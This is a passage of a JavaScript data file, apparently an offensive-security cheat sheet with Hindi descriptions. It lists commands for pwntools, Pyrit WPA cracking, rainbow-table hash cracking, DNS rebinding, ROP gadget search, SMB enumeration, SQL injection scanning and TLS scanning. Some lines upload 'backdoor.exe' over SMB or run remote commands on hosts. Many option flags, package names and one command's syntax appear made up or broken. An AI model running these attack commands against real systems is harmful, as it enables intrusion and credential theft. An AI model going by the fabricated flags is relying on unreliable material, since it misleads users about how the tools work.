      { cmd: "python3 -c 'from pwn import *; e = ELF(\"/bin/bash\"); print(e.checksec())'", desc: "Python API से ELF जाँच" },
      { cmd: "python3 -c 'from pwn import *; print(cyclic(100, n=8))'", desc: "8-बाइट साइक्लिक पैटर्न" },
      { cmd: "python3 -c \"from pwn import *; r = remote('example.com', 80); r.send(b'GET / HTTP/1.0\\r\\n\\r\\n'); print(r.recv())\"", desc: "रिमोट से कनेक्ट" },
      { cmd: "pwn shellcraft -a i386 -l linux execve -f dll > shellcode.dll", desc: "DLL शेलकोड" },
      { cmd: "python3 -c 'from pwn import *; s = ssh(host=\"192.168.1.100\", user=\"root\", password=\"pass\"); print(s.run(\"id\"))'", desc: "SSH के माध्यम से कमांड" }
    ],
    script: "echo 'pwntools एक्सप्लॉइट डेवलपमेंट'\ncat > exploit.py << 'EOF'\nfrom pwn import *\nr = remote('example.com', 1337)\npayload = cyclic(100)\nr.send(payload)\nprint(r.recvall())\nEOF\npython3 exploit.py"
  },
  Pyrit: {
    install: { pkg: "pyrit" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-r <file>", "PCAP फ़ाइल"],
      ["-f <file>", "वर्डलिस्ट"],
      ["-b <bssid>", "BSSID"],
      ["-e <essid>", "ESSID"],
      ["-c <ch>", "चैनल"],
      ["-o <file>", "आउटपुट"],
      ["-u", "अपडेट"],
      ["-l", "लिस्ट"],
      ["-v", "वर्बोज़"]
    ],
    basic: [
      { cmd: "pyrit -r capture.pcap analyze", desc: "PCAP फ़ाइल विश्लेषण" },
      { cmd: "pyrit -f /usr/share/wordlists/rockyou.txt attack_passthrough -r capture.pcap -b 00:11:22:33:44:55 -e MyWiFi", desc: "WPA पासवर्ड क्रैक" },
      { cmd: "pyrit -f wordlist.txt -e MyWiFi create_essid", desc: "ESSID प्रीकंप्यूटेशन" },
      { cmd: "pyrit eval", desc: "कम्प्यूटेशन डेटाबेस मूल्यांकन" },
      { cmd: "pyrit -r capture.pcap -b 00:11:22:33:44:55 -e MyWiFi attack_db", desc: "डेटाबेस से क्रैक" },
      { cmd: "pyrit -i wlan0mon -c 6 list_ap", desc: "AP सूची दिखाएँ" },
      { cmd: "pyrit -f /usr/share/wordlists/rockyou.txt -e WiFiSSID create_essid", desc: "रॉकयू से प्रीकंप्यूट" },
      { cmd: "pyrit batch", desc: "बैच प्रोसेसिंग" },
      { cmd: "pyrit -u", desc: "डेटाबेस अपडेट" },
      { cmd: "pyrit -r hs.pcap attack_db", desc: "हैंडशेक क्रैक" }
    ],
    advanced: [
      { cmd: "pyrit -f /usr/share/wordlists/rockyou.txt -e MyWiFi create_essid && pyrit -r capture.pcap -b 00:11:22:33:44:55 -e MyWiFi attack_db", desc: "प्रीकंप्यूट और क्रैक" },
      { cmd: "pyrit -r capture.pcap analyze 2>&1 | tee pyrit_analyze.log", desc: "PCAP विश्लेषण लॉग" },
      { cmd: "pyrit -f /usr/share/wordlists/rockyou.txt -e WiFi attack_passthrough -r capture.pcap -b 00:11:22:33:44:55 2>&1 | grep -i 'found'", desc: "पासवर्ड मिलने पर मॉनिटर" },
      { cmd: "for ssid in WiFi Guest Corp; do pyrit -f dict.txt -e $ssid create_essid; done", desc: "एकाधिक SSID प्रीकंप्यूट" },
      { cmd: "pyrit eval 2>&1 | grep -i 'computations\\|pmks'", desc: "PMK कम्प्यूटेशन आँकड़े" }
    ],
    script: "echo 'Pyrit WPA क्रैकिंग...'\npyrit -f /usr/share/wordlists/rockyou.txt -e \"$SSID\" create_essid 2>/dev/null\npyrit -r handshake.cap -b $BSSID -e \"$SSID\" attack_db -v 2>&1 | tee /tmp/pyrit.log\ngrep -i 'found' /tmp/pyrit.log && echo 'पासवर्ड मिल गया!'"
  },
  RPCBind: {
    install: { pkg: "rpc-bind" },
    options: [
      ["-p <port>", "पोर्ट"],
      ["-s <host>", "सर्वर"],
      ["-t", "TCP मोड"],
      ["-u", "UDP मोड"],
      ["-v", "वर्बोज़"],
      ["-d <dump>", "डंप मोड"],
      ["-o <file>", "आउटपुट"],
      ["-4", "IPv4"],
      ["-6", "IPv6"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "rpcinfo -p 192.168.1.1", desc: "RPC प्रोग्राम सूची" },
      { cmd: "rpcinfo -s 192.168.1.1", desc: "RPC सर्वर सारांश" },
      { cmd: "rpcinfo -t 192.168.1.1 100003", desc: "TCP RPC जाँच" },
      { cmd: "rpcinfo -u 192.168.1.1 100003", desc: "UDP RPC जाँच" },
      { cmd: "rpcinfo -p 192.168.1.1 -v", desc: "वर्बोज़ RPC जानकारी" },
      { cmd: "rpcinfo -p example.com", desc: "डोमेन RPC स्कैन" },
      { cmd: "rpcinfo -s 192.168.1.0/24", desc: "सबनेट RPC खोज" },
      { cmd: "rpcinfo -p 192.168.1.1 -o rpc_services.txt", desc: "RPC सेवा फ़ाइल में" },
      { cmd: "rpcinfo -t 192.168.1.1 100005", desc: "NFS RPC जाँच" },
      { cmd: "rpcinfo -p 10.0.0.1 -4", desc: "IPv4 RPC स्कैन" }
    ],
    advanced: [
      { cmd: "rpcinfo -p 192.168.1.1 -v 2>&1 | tee rpcinfo.log", desc: "RPC स्कैन लॉग" },
      { cmd: "for ip in $(seq 1 254); do rpcinfo -p 192.168.1.$ip 2>/dev/null; done > all_rpc.txt", desc: "सबनेट RPC स्कैन" },
      { cmd: "rpcinfo -p 192.168.1.1 | grep -i 'nfs\\|mount\\|nlock'", desc: "NFS संबंधित RPC फ़िल्टर" },
      { cmd: "nmap -sS -sU -p 111 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' | xargs -I{} rpcinfo -p {}", desc: "nmap से RPC होस्ट खोजें" },
      { cmd: "rpcinfo -p 192.168.1.1 -v 2>&1 | awk '/program|version/{print}'", desc: "प्रोग्राम वर्ज़न फ़िल्टर" }
    ],
    script: "echo 'RPC स्कैन शुरू...'\nnmap -sS -sU -p 111 192.168.1.0/24 -oG - 2>/dev/null | grep 'open' | awk '{print $2}' > /tmp/rpc_hosts.txt\nwhile read host; do\n  rpcinfo -p $host -v >> /tmp/rpc_services.txt 2>/dev/null\ndone < /tmp/rpc_hosts.txt\necho 'RPC जानकारी /tmp/rpc_services.txt में'"
  },
  RainbowCrack: {
    install: { pkg: "rainbow-crack" },
    options: [
      ["-f <file>", "हैश फ़ाइल"],
      ["-t <table>", "रेनबो टेबल"],
      ["-l <len>", "हैश लंबाई"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-m <alg>", "हैश एल्गोरिदम"],
      ["-p <file>", "पोस्टप्रोसेस"],
      ["-r", "रिकवरी"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "rcrack -t /tables/ -f hashes.txt", desc: "रेनबो टेबल से क्रैक" },
      { cmd: "rcrack -t /rainbow/ -f ntlm.txt -m ntlm", desc: "NTLM रेनबो क्रैक" },
      { cmd: "rcrack -t ./tables/ -f md5_hashes.txt -m md5", desc: "MD5 रेनबो क्रैक" },
      { cmd: "rcrack -t /tables/ -f hashes.txt -o found.txt", desc: "परिणाम फ़ाइल में" },
      { cmd: "rcrack -t /rainbow_tables/ -f sha1.txt -m sha1", desc: "SHA1 रेनबो क्रैक" },
      { cmd: "rcrack -t lm_tables/ -f lm.txt -m lm", desc: "LM हैश रेनबो क्रैक" },
      { cmd: "rcrack -t tables/ -f hashes.txt -v", desc: "वर्बोज़ रेनबो क्रैक" },
      { cmd: "rcrack -t /tables/ -f hashes.txt -s", desc: "साइलेंट मोड" },
      { cmd: "rcrack -t /usr/share/rainbowcrack/ -f sha256.txt", desc: "SHA256 रेनबो क्रैक" },
      { cmd: "rcrack -t . -f hashes.txt -r", desc: "रिकवरी मोड" }
    ],
    advanced: [
      { cmd: "rcrack -t /tables/ -f hashes.txt -v -o cracked.txt 2>&1 | tee rcrack.log", desc: "रेनबो क्रैक लॉग" },
      { cmd: "rcrack -t /tables/ -f hashes.txt -v 2>&1 | grep -i 'found\\|plaintext'", desc: "मिले पासवर्ड फ़िल्टर" },
      { cmd: "for algo in md5 sha1 ntlm; do rcrack -t tables_$algo/ -f hashes_$algo.txt; done", desc: "सभी एल्गोरिदम क्रैक" },
      { cmd: "rcrack -t /tables/ -f hashes.txt -s 2>&1 | awk '/found/{print $NF}'", desc: "सिर्फ़ प्लेनटेक्स्ट निकालें" },
      { cmd: "rcrack -t /tables/ -f hashes.txt -v 2>&1 | tail -20", desc: "अंतिम 20 क्रैक आँकड़े" }
    ],
    script: "echo 'रेनबो टेबल क्रैकिंग...'\nif [ -d /usr/share/rainbowcrack/tables ]; then\n  rcrack -t /usr/share/rainbowcrack/tables -f /tmp/hashes.txt -v -o /tmp/cracked.txt 2>&1 | tee /tmp/rainbow.log\n  echo 'क्रैक किए:' $(wc -l < /tmp/cracked.txt)\nfi"
  },
  Rebind: {
    install: { pkg: "rebind" },
    options: [
      ["-d <domain>", "डोमेन"],
      ["-a <ip>", "अटैक IP"],
      ["-p <port>", "पोर्ट"],
      ["-n <ns>", "नेमसर्वर"],
      ["-t <type>", "रिकॉर्ड प्रकार"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-l", "लिसन मोड"],
      ["-r <host>", "रीबाइंड होस्ट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "rebind -d example.com -a 127.0.0.1", desc: "DNS रीबाइंड अटैक" },
      { cmd: "rebind -d example.com -a 192.168.1.1 -p 53", desc: "पोर्ट 53 रीबाइंड" },
      { cmd: "rebind -d attack.com -a 10.0.0.1 -n 8.8.8.8", desc: "कस्टम नेमसर्वर" },
      { cmd: "rebind -d target.com -a 127.0.0.1 -l", desc: "लिसन मोड" },
      { cmd: "rebind -d example.com -a 192.168.1.100 -v", desc: "वर्बोज़ रीबाइंड" },
      { cmd: "rebind -d test.com -a 0.0.0.0 -t A", desc: "A रिकॉर्ड रीबाइंड" },
      { cmd: "rebind -d example.com -a 192.168.1.1 -r rebind.example.com", desc: "रीबाइंड होस्ट सेट" },
      { cmd: "rebind -d example.com -a 127.0.0.1 -s", desc: "साइलेंट रीबाइंड" },
      { cmd: "rebind -d domain.com -a 10.0.0.5 -t AAAA", desc: "AAAA रिकॉर्ड रीबाइंड" },
      { cmd: "rebind -d target.net -a 172.16.0.1 -p 5353", desc: "पोर्ट 5353 रीबाइंड" }
    ],
    advanced: [
      { cmd: "rebind -d example.com -a 127.0.0.1 -v -l 2>&1 | tee rebind.log", desc: "रीबाइंड अटैक लॉग" },
      { cmd: "rebind -d example.com -a 192.168.1.1 -p 53 & && dig @localhost example.com", desc: "रीबाइंड और dig परीक्षण" },
      { cmd: "tcpdump -i eth0 -w rebind.pcap 'port 53' & rebind -d example.com -a 192.168.1.1", desc: "DNS कैप्चर और रीबाइंड" },
      { cmd: "for ip in 127.0.0.1 10.0.0.1 192.168.1.1; do rebind -d test.com -a $ip -s; done", desc: "एकाधिक रीबाइंड IP" },
      { cmd: "rebind -d example.com -a 0x7f000001 -v 2>&1 | grep -i 'query\\|response'", desc: "DNS क्वेरी/रेस्पॉन्स मॉनिटर" }
    ],
    script: "echo 'DNS रीबाइंड अटैक शुरू...'\nrebind -d example.com -a 192.168.1.100 -p 53 -v -l 2>&1 | tee /tmp/rebind.log &\nREBIND_PID=$!\nsleep 5\necho 'रीबाइंड सर्वर चल रहा है PID:' $REBIND_PID"
  },
  Ropper: {
    install: { pkg: "ropper" },
    options: [
      ["-f <file>", "बाइनरी फ़ाइल"],
      ["-s <search>", "गैजेट खोजें"],
      ["-r <op>", "ROP ऑपरेशन"],
      ["-e", "एक्सट्रैक्ट"],
      ["-a <arch>", "आर्किटेक्चर"],
      ["-p <port>", "पोर्ट"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "ropper -f /bin/ls", desc: "बाइनरी ROP गैजेट खोजें" },
      { cmd: "ropper -f /bin/bash -s 'pop rdi'", desc: "pop rdi गैजेट खोजें" },
      { cmd: "ropper -f /bin/ls -a x86_64", desc: "x86_64 आर्क गैजेट" },
      { cmd: "ropper -f binary.elf -e -o gadgets.txt", desc: "सभी गैजेट निकालें" },
      { cmd: "ropper -f /bin/ls -s 'ret'", desc: "RET गैजेट खोजें" },
      { cmd: "ropper -f /bin/ls -v", desc: "वर्बोज़ गैजेट खोज" },
      { cmd: "ropper -f /bin/ls -q", desc: "शांत मोड" },
      { cmd: "ropper -f /usr/bin/sshd -e -o sshd_gadgets.txt", desc: "sshd गैजेट निकालें" },
      { cmd: "ropper -f /bin/ls -s 'pop rdi; ret'", desc: "pop rdi; ret गैजेट" },
      { cmd: "ropper -f binary.elf --search 'pop rdi' --arch x86_64", desc: "लॉन्ग फ्लैग गैजेट खोज" }
    ],
    advanced: [
      { cmd: "ropper -f /bin/ls -e -o /tmp/gadgets.txt -v 2>&1 | tee ropper.log", desc: "पूर्ण गैजेट निष्कर्षण लॉग" },
      { cmd: "ropper -f /bin/ls -s 'pop rdi; ret' 2>&1 | grep -i '0x' | head -10", desc: "पहले 10 pop rdi गैजेट" },
      { cmd: "for f in /bin/*; do ropper -f $f -s 'syscall' -q 2>/dev/null; done > syscall_gadgets.txt", desc: "सभी बाइनरी में syscall गैजेट" },
      { cmd: "ropper -f /bin/ls -e -q 2>&1 | awk '{print $1}' | head -20", desc: "पहले 20 गैजेट एड्रेस" },
      { cmd: "ropper -f /lib/x86_64-linux-gnu/libc.so.6 -e -o libc_gadgets.txt -v 2>&1 | tail -10", desc: "libc ROP गैजेट सारांश" }
    ],
    script: "echo 'ROP गैजेट खोज रहा है...'\nfor binary in /bin/ls /bin/bash /usr/bin/sshd; do\n  if [ -f $binary ]; then\n    name=$(basename $binary)\n    ropper -f $binary -e -o /tmp/${name}_gadgets.txt -q 2>/dev/null\n    echo \"$name: $(wc -l < /tmp/${name}_gadgets.txt) गैजेट\"\n  fi\ndone"
  },
  SMBClient: {
    install: { pkg: "smbclient" },
    options: [
      ["-L <host>", "SMB शेयर सूची"],
      ["-U <user>", "यूज़रनेम"],
      ["-P <pass>", "पासवर्ड"],
      ["-p <port>", "पोर्ट"],
      ["-c <cmd>", "कमांड चलाएँ"],
      ["-N", "पासवर्ड नहीं"],
      ["-d <domain>", "डोमेन"],
      ["-s <file>", "कॉन्फ़िग फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "smbclient -L //192.168.1.100", desc: "SMB शेयर सूची" },
      { cmd: "smbclient //192.168.1.100/share -U admin", desc: "SMB शेयर कनेक्ट" },
      { cmd: "smbclient -L //192.168.1.100 -N", desc: "पासवर्ड रहित शेयर सूची" },
      { cmd: "smbclient //192.168.1.100/C$ -U administrator", desc: "एडमिन C$ शेयर कनेक्ट" },
      { cmd: "smbclient -L //example.com -U guest", desc: "गेस्ट शेयर सूची" },
      { cmd: "smbclient //192.168.1.100/share -U admin%password", desc: "पासवर्ड के साथ कनेक्ट" },
      { cmd: "smbclient -L //192.168.1.100 -p 445", desc: "पोर्ट 445 पर सूची" },
      { cmd: "smbclient //192.168.1.100/IPC$ -U ''", desc: "IPC$ कनेक्ट" },
      { cmd: "smbclient //192.168.1.100/share -U admin -c 'ls'", desc: "SMB कमांड चलाएँ" },
      { cmd: "smbclient //192.168.1.100/share -U admin -c 'get secret.txt'", desc: "SMB से फ़ाइल डाउनलोड" }
    ],
    advanced: [
      { cmd: "smbclient -L //192.168.1.100 -N -v 2>&1 | tee smbclient.log", desc: "SMB शेयर लॉग" },
      { cmd: "smbclient //192.168.1.100/share -U admin%pass -c 'cd data; ls; get report.txt; put backdoor.exe'", desc: "एकाधिक SMB कमांड" },
      { cmd: "for share in C$ ADMIN$ IPC$; do smbclient //192.168.1.100/$share -U '' -N -c 'ls' 2>&1; done", desc: "एकाधिक शेयर जाँच" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass | grep 'READ' | awk '{print $1}' | xargs -I{} smbclient //192.168.1.100/{} -U admin%pass -c 'ls'", desc: "smbmap से शेयर पाइप" },
      { cmd: "smbclient -L //192.168.1.100 -N 2>&1 | grep -i 'disk\\|share' | awk '{print $1}'", desc: "डिस्क शेयर नाम फ़िल्टर" }
    ],
    script: "echo 'SMB एनुमरेशन...'\nsmbclient -L //192.168.1.100 -N -v 2>&1 | tee /tmp/smb_shares.txt\ngrep 'Disk' /tmp/smb_shares.txt | awk '{print $1}' | while read share; do\n  smbclient //192.168.1.100/$share -N -c 'ls' 2>/dev/null > /tmp/smb_${share}_files.txt\ndone\necho 'SMB स्कैन पूर्ण'"
  },
  SMBMap: {
    install: { pkg: "smbmap" },
    options: [
      ["-H <host>", "लक्ष्य होस्ट"],
      ["-u <user>", "यूज़रनेम"],
      ["-p <pass>", "पासवर्ड"],
      ["-P <port>", "पोर्ट"],
      ["-d <domain>", "डोमेन"],
      ["-x <cmd>", "कमांड चलाएँ"],
      ["-q", "शांत"],
      ["-v", "वर्बोज़"],
      ["--no-banner", "बैनर छुपाएँ"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "smbmap -H 192.168.1.100", desc: "SMB शेयर मैप करें" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p password", desc: "प्रमाणीकृत SMB मैप" },
      { cmd: "smbmap -H 192.168.1.100 -u guest -p ''", desc: "गेस्ट SMB शेयर मैप" },
      { cmd: "smbmap -H 192.168.1.100 -d DOMAIN -u admin -p pass", desc: "डोमेन प्रमाणीकरण" },
      { cmd: "smbmap -H 192.168.1.100 -p 445", desc: "पोर्ट 445 पर मैप" },
      { cmd: "smbmap -H 192.168.1.100 -x 'ipconfig'", desc: "रिमोट कमांड चलाएँ" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass -v", desc: "वर्बोज़ SMB मैप" },
      { cmd: "smbmap -H 192.168.1.100 -q", desc: "शांत SMB मैप" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass -P 139", desc: "पोर्ट 139 पर मैप" },
      { cmd: "smbmap -H 192.168.1.100 --no-banner", desc: "बैनर रहित मैप" }
    ],
    advanced: [
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass -v -x 'whoami' 2>&1 | tee smbmap.log", desc: "प्रमाणीकृत SMB कमांड लॉग" },
      { cmd: "for host in $(cat smb_hosts.txt); do smbmap -H $host -u '' -p '' -q; done > smb_shares.txt", desc: "एकाधिक होस्ट SMB मैप" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass -q 2>&1 | grep -i 'READ\\|WRITE'", desc: "रीड/राइट शेयर फ़िल्टर" },
      { cmd: "smbmap -H 192.168.1.100 -u admin -p pass -x 'dir C:\\Users' 2>&1", desc: "यूज़र डायरेक्टरी लिस्ट" },
      { cmd: "nmap -sS -p 445 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' | xargs -I{} smbmap -H {}", desc: "nmap से SMB होस्ट मैप" }
    ],
    script: "echo 'SMB मैपिंग शुरू...'\nnmap -sS -p 445 192.168.1.0/24 -oG - 2>/dev/null | grep 'open' | awk '{print $2}' > /tmp/smb_hosts.txt\nwhile read host; do\n  echo \"=== $host ===\" >> /tmp/smb_full_map.txt\n  smbmap -H $host -u 'guest' -p '' -q >> /tmp/smb_full_map.txt 2>/dev/null\ndone < /tmp/smb_hosts.txt\necho 'SMB मैपिंग पूर्ण'"
  },
  SNMPCheck: {
    install: { pkg: "snmpcheck" },
    options: [
      ["-t <host>", "लक्ष्य होस्ट"],
      ["-c <community>", "कम्युनिटी"],
      ["-p <port>", "पोर्ट"],
      ["-v <ver>", "SNMP वर्ज़न"],
      ["-o <file>", "आउटपुट"],
      ["-w", "वॉक करें"],
      ["-d", "डीबग"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"]
    ],
    basic: [
      { cmd: "snmpcheck -t 192.168.1.1 -c public", desc: "SNMP जानकारी जाँच" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -v 2c", desc: "SNMPv2c जाँच" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -w", desc: "SNMP वॉक करें" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -o output.txt", desc: "आउटपुट फ़ाइल में" },
      { cmd: "snmpcheck -t 192.168.1.1 -c private", desc: "प्राइवेट कम्युनिटी जाँच" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -v 1", desc: "SNMPv1 जाँच" },
      { cmd: "snmpcheck -t example.com -c public", desc: "डोमेन SNMP जाँच" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -p 161", desc: "पोर्ट 161 SNMP" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -d", desc: "डीबग SNMP जाँच" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -s", desc: "साइलेंट SNMP जाँच" }
    ],
    advanced: [
      { cmd: "snmpcheck -t 192.168.1.1 -c public -w -v 2>&1 | tee snmp_walk.log", desc: "SNMP वॉक लॉग" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -w 2>&1 | grep -i 'user\\|account\\|password'", desc: "संवेदनशील जानकारी फ़िल्टर" },
      { cmd: "for ip in $(seq 1 254); do snmpcheck -t 192.168.1.$ip -c public -s; done > snmp_hosts.txt", desc: "सबनेट SNMP खोज" },
      { cmd: "onesixtyone -c public 192.168.1.1 -q 2>/dev/null && snmpcheck -t 192.168.1.1 -c public -w", desc: "onesixtyone फिर snmpcheck" },
      { cmd: "snmpcheck -t 192.168.1.1 -c public -w 2>&1 | awk -F': ' '/:/{print $1}' | head -30", desc: "पहले 30 SNMP OID" }
    ],
    script: "echo 'SNMP एनुमरेशन...'\nnmap -sU -p 161 192.168.1.0/24 -oG - 2>/dev/null | grep 'open' | awk '{print $2}' > /tmp/snmp_targets.txt\nwhile read host; do\n  snmpcheck -t $host -c public -w -o /tmp/snmp_${host}.txt 2>/dev/null\ndone < /tmp/snmp_targets.txt\necho 'SNMP डेटा /tmp/ में सेव'"
  },
  SQLSus: {
    install: { pkg: "sqlsus" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-d <data>", "POST डेटा"],
      ["-c <cookie>", "कुकी"],
      ["-x <proxy>", "प्रॉक्सी"],
      ["-p <param>", "पैरामीटर"],
      ["-t <type>", "डीबी प्रकार"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sqlsus -u http://example.com/page.php?id=1", desc: "SQL इंजेक्शन स्कैन" },
      { cmd: "sqlsus -u http://example.com/login.php -d 'user=admin&pass=test'", desc: "POST SQLi स्कैन" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -c 'PHPSESSID=abc123'", desc: "कुकी के साथ SQLi" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -x http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ SQLi" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -p id", desc: "विशिष्ट पैरामीटर" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -t mysql", desc: "MySQL SQLi स्कैन" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -o report.txt", desc: "रिपोर्ट सेव करें" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -v", desc: "वर्बोज़ SQLi स्कैन" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -s", desc: "साइलेंट SQLi स्कैन" },
      { cmd: "sqlsus -u https://example.com/page?id=1", desc: "HTTPS SQLi स्कैन" }
    ],
    advanced: [
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -v -x http://127.0.0.1:8080 2>&1 | tee sqlsus.log", desc: "प्रॉक्सी SQLi लॉग" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -v 2>&1 | grep -i 'injectable\\|vuln'", desc: "इंजेक्टेबल पैरामीटर फ़िल्टर" },
      { cmd: "for id in $(seq 1 50); do sqlsus -u \"http://example.com/page.php?id=$id\" -s; done", desc: "ID रेंज SQLi स्कैन" },
      { cmd: "sqlsus -u http://example.com/page.php?id=1 -c 'admin=1' -x http://127.0.0.1:8080 -v", desc: "प्रमाणीकृत SQLi प्रॉक्सी" },
      { cmd: "sqlmap -u http://example.com/page.php?id=1 --batch --dbs && sqlsus -u http://example.com/page.php?id=1 -v", desc: "SQLmap और SQLsus संयोजन" }
    ],
    script: "echo 'SQL इंजेक्शन स्कैन...'\nfor url in $(cat targets.txt); do\n  echo 'स्कैन:' $url\n  sqlsus -u $url -v -o \"sqlsus_$(echo $url | md5sum | cut -c1-8).txt\" 2>/dev/null\ndone\necho 'SQLi स्कैन पूर्ण'"
  },
  SSLScan: {
    install: { pkg: "sslscan" },
    options: [
      ["--no-color", "बिना रंग"],
      ["--targets=<file>", "लक्ष्य फ़ाइल"],
      ["--ports=<ports>", "पोर्ट सीमा"],
      ["--timeout=<sec>", "टाइमआउट"],
      ["--xml=<file>", "XML आउटपुट"],
      ["--show-cert", "सर्ट दिखाएँ"],
      ["--ssl2", "SSLv2 सक्षम"],
      ["--ssl3", "SSLv3 सक्षम"],
      ["--tlsall", "सभी TLS"],
      ["--verbose", "वर्बोज़"]
    ],
    basic: [
      { cmd: "sslscan example.com", desc: "SSL/TLS स्कैन" },
      { cmd: "sslscan example.com:443", desc: "पोर्ट 443 SSL स्कैन" },
      { cmd: "sslscan --no-color example.com", desc: "बिना रंग SSL स्कैन" },
      { cmd: "sslscan --show-cert example.com", desc: "सर्टिफ़िकेट दिखाएँ" },
      { cmd: "sslscan --xml=report.xml example.com", desc: "XML रिपोर्ट" },
      { cmd: "sslscan --timeout=30 example.com", desc: "30 सेकंड टाइमआउट" },
      { cmd: "sslscan --tlsall example.com", desc: "सभी TLS प्रोटोकॉल" },
      { cmd: "sslscan --verbose example.com", desc: "वर्बोज़ SSL स्कैन" },
      { cmd: "sslscan example.com:993", desc: "IMAPS SSL स्कैन" },
      { cmd: "sslscan --ssl2 --ssl3 example.com", desc: "पुराने प्रोटोकॉल जाँच" }
    ],
    advanced: [
      { cmd: "sslscan --verbose --show-cert --xml=scan.xml example.com 2>&1 | tee sslscan.log", desc: "पूर्ण SSL स्कैन लॉग" },
      { cmd: "sslscan --targets=hosts.txt --ports=443,8443 --xml=bulk.xml --verbose 2>&1", desc: "बल्क SSL स्कैन" },
      { cmd: "sslscan --verbose example.com 2>&1 | grep -i 'weak\\|vuln\\|error'", desc: "कमज़ोर सिफ़र फ़िल्टर" },
      { cmd: "for port in 443 8443 993 995; do sslscan example.com:$port; done > ssl_report.txt", desc: "एकाधिक पोर्ट SSL स्कैन" },
      { cmd: "sslscan --show-cert example.com 2>&1 | openssl x509 -text -noout 2>/dev/null", desc: "सर्टिफ़िकेट विवरण" }
    ],
    script: "echo 'SSL/TLS स्कैन शुरू...'\nwhile read host; do\n  sslscan --verbose --xml=\"ssl_${host}.xml\" $host 2>/dev/null\ndone < hosts.txt\necho 'SSL स्कैन पूर्ण'"
  },
  SSLyze: {
    install: { pkg: "sslyze" },
    options: [
      ["-t <host>", "लक्ष्य होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-r", "रीसर्टिफ़िकेशन"],
      ["-c", "सिफ़र सूची"],
      ["-h", "HTTP हेडर"],
      ["-s", "स्टार्टTLS"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-j", "JSON आउटपुट"],
      ["-H", "सहायता"]
    ],
    basic: [
      { cmd: "sslyze example.com", desc: "SSL/TLS विश्लेषण" },
      { cmd: "sslyze example.com:443", desc: "पोर्ट 443 SSLyze" },
      { cmd: "sslyze -r example.com", desc: "रीसर्टिफ़िकेशन जाँच" },
      { cmd: "sslyze -c example.com", desc: "सिफ़र सूची जाँच" },
      { cmd: "sslyze -h example.com", desc: "HTTP हेडर जाँच" },
      { cmd: "sslyze -s example.com:25", desc: "SMTP STARTTLS" },
      { cmd: "sslyze -o report.txt example.com", desc: "रिपोर्ट सेव करें" },
      { cmd: "sslyze -j example.com", desc: "JSON आउटपुट" },
      { cmd: "sslyze -v example.com", desc: "वर्बोज़ SSLyze" },
      { cmd: "sslyze example.com:587 -s", desc: "SMTP पोर्ट 587 TLS" }
    ],
    advanced: [
      { cmd: "sslyze -r -c -h -v example.com 2>&1 | tee sslyze.log", desc: "पूर्ण SSL विश्लेषण लॉग" },
      { cmd: "sslyze -j example.com | jq '.certificate_info'", desc: "JSON सर्टिफ़िकेट जानकारी" },
      { cmd: "sslyze -v example.com 2>&1 | grep -i 'weak\\|error\\|failed'", desc: "कमज़ोरियाँ फ़िल्टर" },
      { cmd: "for host in $(cat ssl_hosts.txt); do sslyze -v -o sslyze_$host.txt $host; done", desc: "एकाधिक होस्ट SSLyze" },
      { cmd: "sslyze -r example.com 2>&1 | grep -i 'subject\\|issuer\\|valid'", desc: "सर्टिफ़िकेट सब्जेक्ट और जारीकर्ता" }
    ],
    script: "echo 'SSL विश्लेषण शुरू...'\nfor host in $(cat ssl_targets.txt); do\n  sslyze -r -c -h -v $host -o /tmp/sslyze_$host.txt 2>/dev/null\ndone\necho 'SSL विश्लेषण पूर्ण'"
  },
  SamDump2: {
    install: { pkg: "sam-dump2" },
    options: [
      ["-f <file>", "SYSTEM फ़ाइल"],
      ["-s <file>", "SAM फ़ाइल"],
      ["-d <file>", "SECURITY फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-H", "हैश ही"],
      ["-u", "यूज़र ही"],
      ["-c", "CSV आउटपुट"],
      ["-p", "पैडिंग दिखाएँ"]
    ],
    basic: [
